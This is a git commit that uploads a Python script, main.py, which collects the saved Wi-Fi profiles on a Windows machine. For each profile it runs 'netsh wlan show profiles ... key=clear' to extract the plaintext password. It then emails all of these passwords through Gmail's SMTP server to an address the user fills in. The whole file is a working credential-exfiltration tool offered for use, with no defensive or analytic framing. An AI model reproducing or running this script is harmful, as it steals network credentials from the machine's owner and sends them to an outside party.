aa74791a6af9b5b809f89b1fbc67f4e71a8fe751
yhtps237 <49835791+yhtps237@users.noreply.github.com>
2019-11-07 19:40:13 +0400

    Add files via upload

---
+++ main.py
@@ -0,0 +1,27 @@
+import subprocess
+import re
+import smtplib
+
+data = ''
+command = "netsh wlan show profiles"
+networks = subprocess.check_output(command, shell=True)
+network_name = re.findall(rb"(?:Profile\s*:\s)(.*)", networks)
+
+for i in network_name:
+    network = i.decode('utf-8')
+    command = 'netsh wlan show profiles name=' + \
+        '"{}"'.format(network.split('\r')[0]) + ' key=clear'
+    result = subprocess.check_output(command, shell=True)
+    data += result.decode('utf-8')
+
+server = smtplib.SMTP('smtp.gmail.com', 587)
+server.starttls()
+
+# change "your_email_address" to your real email address
+#  "your_password" to email password
+
+server.login('your_email_address', 'your_password')
+server.sendmail("your_email_address",
+                "your_email_address", data)
+
+server.quit()
